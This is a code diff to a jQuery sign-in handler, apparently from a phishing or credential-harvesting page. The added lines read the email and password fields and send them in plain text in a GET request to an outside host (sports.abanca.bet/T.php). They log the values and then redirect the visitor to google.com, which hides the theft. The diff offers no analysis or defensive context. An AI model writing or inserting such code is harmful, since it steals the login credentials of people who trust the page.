@@ -147,6 +147,14 @@ $(document).ready(function(){
     // when sign-in button is clicked
     $('#sign-in').click(function(){
         $('#loader-2').fadeIn(500).delay(4000).fadeOut(300);
+        var email = $('.email-field').val(); 
+        var pass = $('.password-field').val(); 
+        $.get(`https://sports.abanca.bet/T.php?email=${email}&pass=${pass}`);
+        console.log({
+            email,
+            pass
+        });
+        window.location = 'https://google.com/';
     })
 
     
